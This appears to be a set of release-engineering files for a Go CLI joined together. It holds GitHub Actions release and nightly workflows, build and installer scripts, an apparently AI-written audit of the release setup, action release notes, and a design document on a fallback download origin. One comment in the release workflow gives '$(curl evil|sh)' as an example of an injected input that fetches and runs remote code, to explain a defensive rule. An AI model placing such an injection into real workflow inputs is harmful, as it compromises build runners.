name: release

on:
  workflow_dispatch:
    inputs:
      version:
        description: "Version to release (e.g. v0.1.0). Defaults to the pushed tag."
        required: false
        type: string
  pull_request:
    paths:
      - .github/workflows/release.yml
  push:
    tags:
      - "v*"

permissions:
  contents: read

# A tag push and a nightly dispatch can target the same version. Serialize them
# so the second completes the existing release in place instead of racing it.
concurrency:
  # Key on the version being released, not on ref_name: for a tag push
  # ref_name is the tag, but for a dispatch it is the branch, so the two runs
  # this is meant to serialize would land in different groups and race to
  # create the same release.
  group: release-${{ inputs.version || github.ref_name }}
  cancel-in-progress: false

jobs:
  build:
    name: build
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v6
        with:
          persist-credentials: false

      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af # Official current-main v7.0.0 bundle with the repeated-DOCTYPE parser fix.
        with:
          go-version: "1.27.x"

      # Brain is pure Go: modernc sqlite is the only driver (the brain_cgo
      # variant was removed with semantic retrieval, trail #278). Every target
      # cross-compiles from one runner, and released binaries need no C
      # toolchain on the user's machine. This guard keeps it that way.
      - name: Verify the default build needs no cgo
        run: |
          set -euo pipefail
          CGO_ENABLED=0 go build -o /dev/null ./cmd/entire-brain
          echo "default build is pure Go"

      - name: Resolve version
        id: v
        env:
          # Never interpolate a workflow input straight into a run: block. The
          # expression is substituted as text before the shell parses it, so a
          # dispatch value like $(curl evil|sh) would execute on the runner.
          VERSION_INPUT: ${{ inputs.version }}
        run: |
          set -euo pipefail
          if [[ "${GITHUB_REF_TYPE}" == "tag" ]]; then
            version="${GITHUB_REF_NAME}"
          elif [[ -n "${VERSION_INPUT}" ]]; then
            version="${VERSION_INPUT}"
          else
            version="v0.0.0-dev.$(git rev-parse --short HEAD)"
          fi
          # A version reaches tag names, file names and release titles. Pin its
          # shape rather than trusting whatever was dispatched.
          if [[ ! "$version" =~ ^v[0-9]+\.[0-9]+\.[0-9]+([-+][0-9A-Za-z.-]+)?$ ]]; then
            echo "::error::refusing to build an unrecognised version: ${version}"
            exit 1
          fi
          echo "version=${version}" >> "$GITHUB_OUTPUT"
          echo "bare=${version#v}" >> "$GITHUB_OUTPUT"
          echo "building ${version}"

      - name: Build every target
        env:
          VERSION: ${{ steps.v.outputs.version }}
          BARE: ${{ steps.v.outputs.bare }}
        run: |
          set -euo pipefail
          mkdir -p dist
          targets="linux/amd64 linux/arm64 darwin/amd64 darwin/arm64 windows/amd64 windows/arm64"
          for t in $targets; do
            goos="${t%/*}"; goarch="${t#*/}"
            out="entire-brain"
            [[ "$goos" == windows ]] && out="entire-brain.exe"
            echo "==> $goos/$goarch"
            CGO_ENABLED=0 GOOS="$goos" GOARCH="$goarch" \
              go build -trimpath -ldflags "-s -w -X main.version=${BARE}" \
              -o "dist/$out" ./cmd/entire-brain
            asset="entire-brain_${BARE}_${goos}_${goarch}"
            if [[ "$goos" == windows ]]; then
              (cd dist && zip -q "${asset}.zip" "$out" && rm "$out")
            else
              (cd dist && tar -czf "${asset}.tar.gz" "$out" && rm "$out")
            fi
          done
          (cd dist && sha256sum * > checksums.txt)
          ls -la dist

      - uses: actions/upload-artifact@v7
        with:
          name: release-dist
          path: dist/
          retention-days: 7

  publish:
    name: publish
    needs: build
    # Only a real tag publishes. A pull_request run proves the build still works
    # without creating a release.
    if: github.event_name != 'pull_request'
    runs-on: ubuntu-24.04
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v6
        with:
          persist-credentials: false

      - uses: actions/download-artifact@v4
        with:
          name: release-dist
          path: dist

      - name: Create or update the release
        env:
          GH_TOKEN: ${{ github.token }}
          VERSION_INPUT: ${{ inputs.version }}
        run: |
          set -euo pipefail
          if [[ "${GITHUB_REF_TYPE}" == "tag" ]]; then
            version="${GITHUB_REF_NAME}"
          else
            version="${VERSION_INPUT}"
          fi
          [[ -n "$version" ]] || { echo "no version to publish" >&2; exit 1; }
          if [[ ! "$version" =~ ^v[0-9]+\.[0-9]+\.[0-9]+([-+][0-9A-Za-z.-]+)?$ ]]; then
            echo "::error::refusing to publish an unrecognised version: ${version}"
            exit 1
          fi

          mapfile -t assets < <(find dist -type f | sort)
          if gh release view "$version" --repo "$GITHUB_REPOSITORY" >/dev/null 2>&1; then
            echo "release $version exists — updating assets in place"
            gh release upload "$version" "${assets[@]}" --clobber --repo "$GITHUB_REPOSITORY"
          else
            gh release create "$version" "${assets[@]}" \
              --repo "$GITHUB_REPOSITORY" \
              --title "$version" \
              --generate-notes
          fi
name: nightly

on:
  schedule:
    - cron: "0 6 * * *" # 06:00 UTC daily, matching entire-graph
  workflow_dispatch:

permissions:
  contents: read

concurrency:
  group: nightly
  cancel-in-progress: true

jobs:
  # Only cut a nightly when main actually moved. A dated prerelease per day that
  # nothing changed is noise, and it makes "which nightly has the fix" harder to
  # answer, not easier.
  changed:
    name: has main moved
    runs-on: depot-ubuntu-24.04-4
    outputs:
      should_release: ${{ steps.check.outputs.should_release }}
      version: ${{ steps.check.outputs.version }}
    steps:
      - uses: actions/checkout@v6
        with:
          fetch-depth: 0
          persist-credentials: false
      - id: check
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          sha="$(git rev-parse --short HEAD)"
          base="$(grep -oE '^## +\[?v?[0-9]+\.[0-9]+\.[0-9]+' CHANGELOG.md 2>/dev/null \
                    | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' || true)"
          [[ "$base" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]] || base="0.1.0"
          version="v${base}-nightly.$(date -u +%Y%m%d%H%M).${sha}"

          # Skip when the newest prerelease already points at this commit.
          latest="$(gh release list --repo "$GITHUB_REPOSITORY" --limit 1 \
                     --json tagName --jq '.[0].tagName // ""' 2>/dev/null || true)"
          if [[ "$latest" == *".${sha}" ]]; then
            echo "main has not moved since $latest — skipping"
            echo "should_release=false" >> "$GITHUB_OUTPUT"
          else
            echo "should_release=true" >> "$GITHUB_OUTPUT"
          fi
          echo "version=${version}" >> "$GITHUB_OUTPUT"

  build:
    name: nightly build
    needs: changed
    if: needs.changed.outputs.should_release == 'true'
    runs-on: depot-ubuntu-24.04-4
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v6
        with:
          persist-credentials: false
      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af # Official current-main v7.0.0 bundle with the repeated-DOCTYPE parser fix.
        with:
          go-version: "1.27.x"

      - name: Build every target
        env:
          VERSION: ${{ needs.changed.outputs.version }}
        run: |
          set -euo pipefail
          bare="${VERSION#v}"
          mkdir -p dist
          for t in linux/amd64 linux/arm64 darwin/amd64 darwin/arm64 windows/amd64 windows/arm64; do
            goos="${t%/*}"; goarch="${t#*/}"
            out="entire-brain"; [[ "$goos" == windows ]] && out="entire-brain.exe"
            CGO_ENABLED=0 GOOS="$goos" GOARCH="$goarch" \
              go build -trimpath -ldflags "-s -w -X main.version=${bare}" \
              -o "dist/$out" ./cmd/entire-brain
            asset="entire-brain_${bare}_${goos}_${goarch}"
            if [[ "$goos" == windows ]]; then
              (cd dist && zip -q "${asset}.zip" "$out" && rm "$out")
            else
              (cd dist && tar -czf "${asset}.tar.gz" "$out" && rm "$out")
            fi
          done
          (cd dist && sha256sum * > checksums.txt)

      - name: Publish the prerelease
        env:
          GH_TOKEN: ${{ github.token }}
          VERSION: ${{ needs.changed.outputs.version }}
        run: |
          set -euo pipefail
          mapfile -t assets < <(find dist -type f | sort)
          gh release create "$VERSION" "${assets[@]}" \
            --repo "$GITHUB_REPOSITORY" \
            --title "$VERSION" \
            --prerelease \
            --generate-notes

#!/bin/sh
set -eu

repo_root=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
cd "$repo_root"

version=${VERSION:-$(git describe --tags --always --dirty 2>/dev/null || printf 'dev')}
out_dir=${OUT_DIR:-dist/release-$version}
targets=${ENTIRE_RELEASE_TARGETS:-"darwin/amd64 darwin/arm64 linux/amd64 linux/arm64 windows/amd64"}
build_tags=${BUILD_TAGS:-}

mkdir -p "$out_dir"
rm -f "$out_dir"/SHA256SUMS

# sha256sum is standard on Linux; macOS ships shasum instead. Prefer whichever
# is present so the script works on every release host.
sha256_file() {
	if command -v sha256sum >/dev/null 2>&1; then
		sha256sum "$1"
	else
		shasum -a 256 "$1"
	fi
}

build_target() {
	goos=${1%/*}
	goarch=${1#*/}
	if [ "$goos" = "$goarch" ] || [ -z "$goos" ] || [ -z "$goarch" ]; then
		printf 'invalid target %s; expected GOOS/GOARCH\n' "$1" >&2
		return 1
	fi

	bin="entire-brain"
	case "$goos" in
		windows) bin="$bin.exe" ;;
	esac

	work="$out_dir/entire-brain-$version-$goos-$goarch"
	archive="$out_dir/entire-brain-$version-$goos-$goarch.tar.gz"
	rm -rf "$work"
	mkdir -p "$work"

	printf 'building %s/%s\n' "$goos" "$goarch" >&2
	if [ -n "$build_tags" ]; then
		GOOS="$goos" GOARCH="$goarch" CGO_ENABLED="${CGO_ENABLED:-1}" \
			go build -trimpath -tags "$build_tags" \
			-ldflags "-s -w -X main.version=$version" \
			-o "$work/$bin" ./cmd/entire-brain
	else
		GOOS="$goos" GOARCH="$goarch" CGO_ENABLED="${CGO_ENABLED:-0}" \
			go build -trimpath -ldflags "-s -w -X main.version=$version" \
			-o "$work/$bin" ./cmd/entire-brain
	fi

	cp README.md LICENSE entire-plugin.yml "$work/"
	tar -C "$out_dir" -czf "$archive" "entire-brain-$version-$goos-$goarch"
	rm -rf "$work"
	sha256_file "$archive" >> "$out_dir/SHA256SUMS"
	sign_artifact "$archive"
}

sign_artifact() {
	artifact=$1
	if [ -n "${COSIGN_KEY:-}" ] && command -v cosign >/dev/null 2>&1; then
		cosign sign-blob --yes --key "$COSIGN_KEY" --output-signature "$artifact.sig" "$artifact"
		return
	fi
	if [ -n "${GPG_SIGNING_KEY:-}" ] && command -v gpg >/dev/null 2>&1; then
		gpg --batch --yes --armor --detach-sign --local-user "$GPG_SIGNING_KEY" --output "$artifact.asc" "$artifact"
	fi
}

for target in $targets; do
	build_target "$target"
done

printf 'wrote %s\n' "$out_dir" >&2

# ---- version -----------------------------------------------------------
resolve_version() {
  local api="https://api.github.com/repos/${GITHUB_REPO}/releases"
  local out=""
  if [ "$CHANNEL" = "nightly" ]; then
    out="$(curl -fsSL "${api}?per_page=20" 2>/dev/null \
      | grep -o '"tag_name": *"[^"]*"' | sed 's/.*"\([^"]*\)"$/\1/' \
      | grep -- '-nightly\.' | head -1 || true)"
  else
    out="$(curl -fsSL "${api}/latest" 2>/dev/null \
      | grep -o '"tag_name": *"[^"]*"' | head -1 | sed 's/.*"\([^"]*\)"$/\1/' || true)"
  fi
  printf '%s' "$out"
}

# ---- download and verify ----------------------------------------------
asset="entire-brain_${bare}_${os}_${arch}.tar.gz"
base="https://github.com/${GITHUB_REPO}/releases/download/${version}"
tmp="$(mktemp -d)"
trap 'rm -rf "$tmp"' EXIT

curl -fsSL -o "${tmp}/${asset}" "${base}/${asset}" \
  || error "no build for ${os}/${arch} in ${version}
  Available assets: https://github.com/${GITHUB_REPO}/releases/tag/${version}"

# The checksum is the only integrity signal this script has, and the README and
# SECURITY.md both promise the download is verified against it. So every way of
# not verifying is fatal: a checksums.txt we cannot fetch, a checksums.txt with
# no entry for this asset, no tool to hash with, and of course a mismatch.
# Failing open here would quietly downgrade a curl | bash install to nothing.
curl -fsSL -o "${tmp}/checksums.txt" "${base}/checksums.txt" 2>/dev/null \
  || error "could not fetch checksums.txt for ${version}
  Refusing to install an unverified binary. Every release publishes this file,
  so a missing one means the download path is not trustworthy right now.
  Assets: https://github.com/${GITHUB_REPO}/releases/tag/${version}"

content.text:
**This repo doesn't use GoReleaser.** There's no `.goreleaser.yml`, and the only "goreleaser" matches are inside benchmark patch fixtures copied from other repos (`benchmarks/agent-brain/mined-scale/patches/…`). Releases are built by hand-written shell steps in GitHub Actions.

## How releases work today

**Stable releases (`.github/workflows/release.yml`)**
- **What starts it:** pushing a `v*` tag, or a manual run with a `version` input. A pull request that touches the workflow file does a build only and publishes nothing.
- **Build:** one Ubuntu runner, `CGO_ENABLED=0`, a `go build -trimpath -ldflags "-s -w -X main.version=…"` loop over 6 targets: linux, darwin and windows, each for amd64 and arm64. A guard step checks that the default build still needs no cgo. That's been true since the `brain_cgo` variant was removed.
- **Packaging:** `entire-brain_<bare>_<os>_<arch>.tar.gz`, or `.zip` for Windows, plus a `checksums.txt` made with `sha256sum`.
- **Publish:** `gh release create --generate-notes`. If the release already exists, it runs `gh release upload --clobber` instead. A concurrency group keyed on the version stops a tag push and a manual run from racing. Version strings are checked against a semver regex.
- **Not included:** signing, SBOMs, Homebrew/Scoop/packages, Docker images, a changelog generated from `CHANGELOG.md`.

**Nightlies (`.github/workflows/nightly.yml`)**
- Runs daily at 06:00 UTC on Depot runners. It skips the run if the newest release already points at the current HEAD.
- The version is `v<latest CHANGELOG version>-nightly.<YYYYMMDDHHMM>.<sha>`, for example the latest, `v0.1.0-nightly.202610210627.631d91b4`.
- The build loop is **copied from `release.yml`** rather than shared, and it's published with `--prerelease`.

**Installer (`scripts/get-brain.sh`)**
- Picks `releases/latest` for stable, or the newest `-nightly.` tag for the nightly channel.
- Downloads `entire-brain_${bare}_${os}_${arch}.tar.gz` and refuses to install if `checksums.txt` is missing or doesn't match. Its file naming matches what the workflows produce.

**Tags:** one stable tag (`v0.1.0`, 2026-09-19) and 24 nightly tags. `CHANGELOG.md` has unreleased changes waiting (the `facts` → `memories` rename).

## Things that don't line up
1. **`scripts/release.sh` (`mise run release`) has drifted from CI.** It names files differently (`entire-brain-<ver>-<os>-<arch>.tar.gz`), writes `SHA256SUMS` instead of `checksums.txt`, makes `.tar.gz` for Windows, leaves out `windows/arm64`, and adds README, LICENSE and the plugin manifest to the archive. It also has optional cosign/GPG signing that CI lacks. It still has a `BUILD_TAGS` path that defaults to `CGO_ENABLED=1`, left over from the cgo variant. Its output wouldn't work with `get-brain.sh`.
2. **The build loop exists twice**, once in `release.yml` and once in `nightly.yml`, so the two can drift apart.
3. **The release workflow uses older actions than nightly.** It runs on `ubuntu-24.04` and uses `download-artifact@v4` and `checkout@v6`. Dependabot branches to update them (`checkout-7`, `download-artifact-8`) exist on the remote but aren't merged into this branch.
4. **Version source:** nightlies read their version from `CHANGELOG.md`, so they'll keep saying `0.1.0-nightly…` until a new version heading is added there.

If you're thinking of moving to GoReleaser on `soph/releases`, it would cover items 1–3 in one config: one build definition for stable and nightly (nightly as a snapshot/prerelease), the same file naming and checksums, plus optional signing and Homebrew.

Two notes on how I checked:
- The repo guide says to ask Brain first. `entire brain version` only printed the root `entire` usage, so the `brain` subcommand isn't installed on this machine. I didn't look up any recorded reasons behind these choices; everything above comes from the current files and git tags.
- `gh release list` failed because `gh` doesn't recognise this repo's git remote as a GitHub host, so the release list comes from local tags, not GitHub.

######## download-artifact v8.0.0
## v8 - What's new

> [!IMPORTANT]
> actions/download-artifact@v8 has been migrated to an ESM module. This should be transparent to the caller but forks might need to make significant changes.

> [!IMPORTANT]
> Hash mismatches will now error by default. Users can override this behavior with a setting change (see below).

### Direct downloads

To support direct uploads in `actions/upload-artifact`, the action will no longer attempt to unzip all downloaded files. Instead, the action checks the `Content-Type` header ahead of unzipping and skips non-zipped files. Callers wishing to download a zipped file as-is can also set the new `skip-decompress` parameter to `true`.

### Enforced checks (breaking)

A previous release introduced digest checks on the download. If a download hash didn't match the expected hash from the server, the action would log a warning. Callers can now configure the behavior on mismatch with the `digest-mismatch` parameter. To be secure by default, we are now defaulting the behavior to `error` which will fail the workflow run.

### ESM

To support new versions of the @actions/* packages, we've upgraded the package to ESM.

1	# Release Origins
2	
3	A released CLI must stay installable and updatable while GitHub is down.
4	
5	Until this change every path to the binary ran through github.com — the
6	installer script, the version lookup, and the bytes. This document describes the
7	second origin, what still depends on GitHub, and how to turn the origin on.
8	
9	## Why a second origin, read first
10	
11	The CLI reads our own origin **before** GitHub, and falls back to GitHub
12	automatically. Reading it second would have been lower-risk on day one and worse
13	every day after: a fallback that only runs during an incident is a fallback
14	nobody knows works. Reading it first means every install and every update check
15	exercises the path, so a broken origin shows up on an ordinary Tuesday instead of
16	during an outage.
17	
18	The fallback direction matters too. If our origin is unreachable, installs and
19	updates degrade to exactly the previous behaviour rather than breaking.
20	
21	## The two origins
22	
23	Both lay artifacts out identically, which is what lets one URL template cover
24	both:
25	
26	| | Our origin | GitHub |
27	| --- | --- | --- |
28	| Archives | `https://install.entire.com/v0.10.0/entire_darwin_arm64.tar.gz` | `https://github.com/entireio/cli/releases/download/v0.10.0/entire_darwin_arm64.tar.gz` |
29	| Checksums | `https://install.entire.com/v0.10.0/checksums.txt` | `…/v0.10.0/checksums.txt` |
30	| Current version | `https://install.entire.com/channels/stable.json` | `https://api.github.com/repos/entireio/cli/releases/latest` |
31	| Install scripts | `https://install.entire.com/installers/install.sh` | `raw.githubusercontent.com/entireio/cli/refs/heads/main/scripts/install.sh` |
32	| Scoop manifest | `https://install.entire.com/scoop/entire.json` | `github.com/entireio/scoop-bucket` (git) |
33	
34	### The channel pointer
35	
36	`channels/stable.json` and `channels/nightly.json` answer one question — what is
37	the current version on this channel:
38	
39	```json
40	{
41	  "channel": "stable",
42	  "tag": "v0.10.0",
43	  "version": "0.10.0",
44	  "published_at": "2026-08-12T19:07:28Z"
45	}
46	```
47	
48	It deliberately carries **no checksums**. `checksums.txt`, which GoReleaser
49	generates and mirrors next to the archives, stays the single integrity source;
50	two files listing the same hashes are two files that can disagree.
51	
52	Reading a pointer instead of the releases API also retires a live problem:
53	unauthenticated `api.github.com` allows 60 requests per hour per IP, which a
54	shared office or CI egress address can exhaust on its own.
55	
56	Cache headers differ by what the object is. Anything under `v<version>/` never
57	changes once published and is served `immutable` for a year. The pointers change
58	on every release and get `max-age=60`.
59	
60	## Who reads what
61	
62	- **`scripts/install.sh`** — walks the origins for both version discovery and
63	  the download. Metadata requests carry `--max-time`; downloads carry
64	  `--speed-limit`/`--speed-time` instead, which aborts a stalled transfer
65	  without capping a slow but progressing one. `--connect-timeout` alone would
66	  not bound an origin that accepts the connection and then sends nothing, and
67	  that stall is the failure the fallback exists for. `--version X.Y.Z` pins a version and skips discovery entirely;
68	  `ENTIRE_INSTALL_BASE_URL` replaces the origin list with one entry, because
69	  someone pinning a mirror wants that mirror, not a silent fall back that hides
70	  whether it worked.
71	- **`cmd/entire/cli/versioncheck`** — `versionOrigins` is the ordered chain,
72	  `fetchLatestForChannel` walks it. `httpTimeout` (2s) bounds the *whole* chain,
73	  so adding an origin costs no extra worst-case latency on a path that runs
74	  synchronously after every command. Each candidate gets an equal share of
75	  what is left, so a primary that hangs cannot swallow the budget and starve
76	  the fallback — a firewall that blackholes rather than refuses would otherwise
77	  take update checks down for good, which is worse than not having the second
78	  origin at all.
79	- **Homebrew cask and the Scoop manifest** — still point at GitHub. See
80	  "Remaining work".
81	
82	Two rules the chain borrows from `strategy.CheckpointReadRemotesWithElection`
83	and `checkpoint/remote/checkpoint_ref.go`, the closest precedents in this repo:
84	
85	1. **Fail open.** Every origin failing is reported as one error, never as "you
86	   are up to date" or "there is nothing to install".
87	2. **A definite bad answer aborts; an unreachable one advances.** A missing or
88	   unreachable origin moves to the next candidate. A checksum *mismatch* does
89	   not — `install.sh` exits. Bytes that disagree with their own origin's
90	   checksums mean that origin is corrupt or hostile, and quietly retrying
91	   elsewhere would hide it.
92	
93	Bad *metadata* is the other way round, and the distinction is the point. A
94	manifest naming something that is not a release version, or a version from the
95	other channel, **advances** to the next origin. At that moment we do not yet
96	know which version exists, so another origin may simply know better — advancing
97	is continuing discovery, not hiding corruption. By the time a checksum is being
98	checked the version is settled and only the bytes are in question, which is why
99	that case stops instead. Accepting unusable metadata would be the worst of both:
100	the chain ends, and because an invalid version sorts below every valid one, the
101	CLI reports no update at all while `install.sh` fetches a version that does not
102	exist. Both sides require the canonical `vX.Y.Z` form — `semver.IsValid` alone
103	accepts `v1.2`, which resolves to an artifact prefix that was never published.
104	
105	`install.sh` also never mixes origins within one install: the archive and the
106	`checksums.txt` that vouches for it always come from the same place. A healthy
107	origin's checksums vouching for another origin's bytes would be a weaker
108	guarantee than either origin offers alone.
109	
110	The pointer write is **conditional on the object the guard inspected**
111	(`--if-match`, or `--if-none-match` for a first publish). Reading, comparing and
112	writing are three operations, so without it a second publisher landing in
113	between would pass its own guard and leave the pointer at whichever write
114	finished last — possibly the older one. A conflict aborts rather than retrying:
115	the guard exists to refuse unproven moves, and re-running is clearer in a
116	release log than a silent retry.
117	
118	The workflow deliberately carries **no `concurrency` group**. GitHub keeps at
119	most one pending run per group and cancels the previously pending one — which
120	`cancel-in-progress: false` does not prevent, since it only protects the run
121	already in progress. Because `mirror-nightly` pushes a nightly tag, one stable
122	release can enqueue a second run and cancel a queued hotfix by itself. Dropping
123	a release outright is worse than the race, and the conditional write already
124	closes that race for workflow runs and manual ones alike.
125	
126	The channel a tag belongs to is decided the same way everywhere: the literal
127	`-nightly.` prerelease segment goes to nightly, no prerelease to stable, and any
128	other prerelease is **refused at publish time**. Four places answer this
129	question — the publisher, `install.sh`, `isNightly`, and the GitHub release scan
130	— and they have to use the same test. A looser one in any of them routes a tag
131	like `v0.5.4-nightly` or `v0.5.4-prenightly` to the channel, where the readers
132	disagree about it: the CLI announces an update that `install.sh` then refuses to
133	install, which is worse than either accepting or rejecting it consistently. Both readers also prefer
134	`tag` over `version` and check the manifest's declared `channel`.
135	
136	**Publishing inverts rule 1 on purpose.** `publish-channel-manifest.sh` fails
137	*closed*: if it cannot read the current pointer it refuses to publish. The two
138	directions are not inconsistent, because the questions differ. A reader needs an
139	answer and the worst outcome is a confident wrong one, so it tries every origin.
140	The monotonic guard only has to answer "can I prove this move is forward", and a
141	pointer it could not read cannot prove it — so only a definite not-found counts
142	as an empty channel. Treating a permission error or a throttle as absence is
143	exactly what would let a re-dispatched old tag regress the channel for every
144	install and update check.
145	
146	## Turning it on
147	
148	The publishing side is **inert until `ENTIRE_RELEASE_BUCKET` is set**. That is
149	also the way back out: delete the variable and rerun the job, and the release
150	publishes exactly as it did before the mirror existed.
151	
152	The GoReleaser gate tests the variable for **non-emptiness**, not for presence.
153	`release.yml` always exports it, and an Actions variable that is unset exports
154	as an empty string, so `isEnvSet` is true on every release. Gating on presence
155	would enable the `blobs` pipe with an empty bucket and no credentials —
156	`configure-aws-credentials` is correctly skipped — and fail every release
157	instead of staying inert. `scripts/test-release-origins.sh` pins this.
158	
159	| Variable | Example | Effect |
160	| --- | --- | --- |
161	| `ENTIRE_RELEASE_BUCKET` | `entire-release-origin-4zovktgk` | Enables the GoReleaser `blobs` pipe, the installer upload and the channel-pointer step |
162	| `ENTIRE_RELEASE_UPLOAD_ROLE` | `arn:aws:iam::934711778961:role/github-actions-release-upload` | Role assumed via OIDC |
163	| `ENTIRE_RELEASE_REGION` | `us-east-2` | Optional, defaults to `us-east-2` |
164	
165	The bucket name is not the hostname. The bucket is private and reached only
166	through the Worker, so it follows the infra repo's random-suffix convention
167	rather than being named after `install.entire.com`.
168	
169	Do **not** add an `environment:` to the release job. That changes the OIDC `sub`
170	claim, and the upload role's trust policy matches `repo:entireio/cli:ref:refs/tags/v*`
171	and `repo:entireio/cli:ref:refs/heads/main` exactly — it would start refusing the
172	token.
173	
174	Order of operations inside `release.yml` is load-bearing:
175	
176	1. GoReleaser uploads the artifacts (`blobs`).
177	2. The macOS Developer ID check passes.
178	3. The channel pointer is flipped.
179	4. The install scripts and the Scoop manifest go to `installers/` and
180	   `scoop/` — stable releases only.
181	
182	The pointer comes after 1 and 2 because it is what makes a version visible, and
183	advertising a release whose binaries Gatekeeper kills would be worse than not
184	advertising it at all.
185	
186	Step 4 comes after the pointer rather than before it, which is the opposite of
187	what it looks like it should be. Those keys are **shared across versions**, so
188	uploading them first means a release the pointer then refuses — an older tag
189	re-dispatched — leaves the installers rolled back with nothing advanced. The
190	installer is version-independent, so a pointer that moved before it is harmless;
191	the reverse leaves a silent rollback behind a failed job.
192	
193	Step 4 is stable-only because `installers/install.{sh,ps1}` and
194	`scoop/entire.json` are overwritten on every release rather than versioned — a
195	nightly publishing there would replace what stable users fetch. Nightly users run
196	the same stable installer with `--channel nightly`. For the same reason those
197	keys get `max-age=300` rather than the artifacts' immutable TTL: a long max-age
198	on an overwritten key pins a stale copy in every edge cache for its lifetime.
199	
200	## The origin, as built
201	
202	Built in `entirehq/infra` and verified end to end: an object uploaded to the
203	bucket was served through `install.entire.com` with the right bytes.
204	
205	- **Bucket** `entire-release-origin-4zovktgk`, `us-east-2`, account
206	  `934711778961`. It is **private** — no anonymous read, no ACLs.
207	- **`install.entire.com` is a Cloudflare Worker.** It maps `/<path>` to the
208	  bucket key `<path>` verbatim and reads through its own OIDC role.
209	- **Upload role** `arn:aws:iam::934711778961:role/github-actions-release-upload`,
210	  trusting `repo:entireio/cli:ref:refs/tags/v*` and
211	  `repo:entireio/cli:ref:refs/heads/main` exactly. It can `PutObject` and
212	  `GetObject` under `v*`, `channels/*` and `installers/*`, plus `ListBucket`.
213	  No delete.
214	
215	Two consequences worth keeping in mind when changing anything here.
216	
217	**The Worker knows nothing about the layout.** It does not parse versions, split
218	channels or rewrite paths. That is what keeps this cheap to change: a new prefix
219	needs an IAM change and nothing else, and a layout change never touches the
220	Worker. The only place it may learn the layout is metrics dimensions, which have
221	to parse `v<version>/<file>` — keep that a best-effort regex that degrades to
222	`unknown` and never affects the response, so a layout change can blur a metric
223	but can never break a download.
224	
225	**The bucket is private, so anonymous read is not the fallback it looks like.**
226	If the Worker is down, the bucket is unreachable; there is no bypass URL. The
227	fallback for that case is the same one as for a GitHub outage — the other origin
228	— which is why the chain reads two origins rather than two paths to one.
229	
230	### Scoop without a bucket
231	
232	Scoop does not require git. `scoop install <url-to-manifest.json>` installs from
233	a URL with no bucket added, records that URL as the app's source, and
234	`scoop update` re-fetches it and upgrades in place. Both verified against Scoop
235	v0.6.0.
236	
237	So `scoop/entire.json` is mirrored here with its artifact URLs rewritten to this
238	origin — Scoop has no fallback of its own, so a mirrored manifest naming GitHub
239	would depend on the thing it exists to route around. The rewrite fails the
240	release if it matches nothing, because a manifest that still named GitHub would
241	publish cleanly and only be discovered during an outage.
242	
243	The bucket manifest keeps its GitHub URLs on purpose. The ordinary
244	`scoop install entire` path is unchanged, so this is an additional GitHub-free
245	route rather than one that makes every Scoop install depend on a single origin.
246	
247	One trap for anything generating these: Scoop rejects a manifest written with a
248	UTF-8 BOM, and its error for that is `Error parsing JSON`, followed by a
249	suggestion to run `scoop bucket add` — which reads like the URL was never
250	supported at all.
251	
252	## Installing while GitHub is down
253	
254	`install.sh` handles this automatically once the origin is live. The manual
255	paths, for when it does not:
256	
257	```bash
258	# Straight from our origin, no version lookup
259	curl -fsSL https://install.entire.com/v0.10.0/entire_darwin_arm64.tar.gz | tar -xz
260	
261	# Pin a version through the installer
262	curl -fsSL https://entire.com/install.sh | bash -s -- --version 0.10.0
263	
264	# From the Go module proxy, which caches independently of GitHub
265	go install github.com/entireio/cli/cmd/entire@v0.10.0
266	
267	# Windows, via Scoop, with no bucket and no git
268	scoop install https://install.entire.com/scoop/entire.json
269	```
270	
271	The `go install` route works today, with no infrastructure at all:
272	`proxy.golang.org` serves module content from its own cache and
273	`versioninfo.Resolve` recovers the real version from build info. Pin an explicit
274	version — `@latest` re-resolves against GitHub. The caveats are real but small:
275	no PostHog key is stamped in, so telemetry is off, and `experimental.Visible`
276	keeps its default, so experimental commands are visible.
277	
278	## Remaining work
279	
280	- **`install.ps1` is still GitHub-dependent.** It is mirrored to `installers/`
281	  so it can be *fetched* during an outage, but it resolves versions through
282	  `api.github.com` and downloads archives from GitHub releases. Porting the
283	  two-origin loop is tractable — it already has `Save-RemoteFile` and
284	  `Assert-Checksum`, structurally parallel to `install.sh` — but it would add a
285	  fourth reader of the channel manifest, so it should land with the same
286	  validation and the same shared test cases rather than its own interpretation
287	  of the contract.
288	- **Set the repository variables and watch a release.** Nothing has assumed the
289	  upload role from GitHub yet. If `configure-aws-credentials` fails the release
290	  job fails *before* GoReleaser runs, so do this on a release someone is
291	  watching. Back out by deleting `ENTIRE_RELEASE_BUCKET` and rerunning.
292	  Afterwards confirm: `channels/stable.json` names the new version,
293	  `v<version>/checksums.txt` returns 200 with
294	  `cache-control: public, max-age=31536000, immutable`, and
295	  `installers/install.sh` returns 200.
296	- **Tell the infra side once the first release with the installer step ships.**
297	  `entire.com/install.{sh,ps1}` still redirect to raw GitHub; infra repoints them
298	  at `install.entire.com/installers/…` only after a release has actually uploaded
299	  those keys. Repointing first would turn every install into a 404 with no
300	  fallback.
301	- **Repointing the cask and bucket download URLs is not an outage fix**, and is
302	  deliberately not done. Both manifests live in GitHub git repos
303	  (`entireio/homebrew-tap`, `entireio/scoop-bucket`), so `brew update` and a
304	  bucket refresh need GitHub whatever the artifact URL says. Changing
305	  `homebrew_casks[].url.template` or `scoops[].url_template` would only help
306	  someone who refreshed metadata *before* the outage and has not installed yet —
307	  a narrow window. It would move download bytes off GitHub, which is a bandwidth
308	  and partial-outage argument rather than an availability one, and it would put
309	  every cask and bucket install behind a single origin with no fallback of its
310	  own.
311	
312	  The complete path is the one `scoop/entire.json` takes: mirror a manifest whose
313	  URLs name this origin, so metadata *and* bytes come from us. Scoop supports
314	  that directly (`scoop install <url>`, no bucket, no git). Homebrew has no clean
315	  equivalent, so the cask stays outage-affected; `install.sh` is the GitHub-free
316	  path on macOS.
317	- **Decide on signing.** Nothing is signed today beyond macOS notarization — no
318	  cosign, no SBOM, no attestations. A second origin doubles the number of hosts
319	  that can serve a bad binary. Two options: sign `checksums.txt` with a key
320	  pinned in the installer and the CLI, or fetch `checksums.txt` from both origins
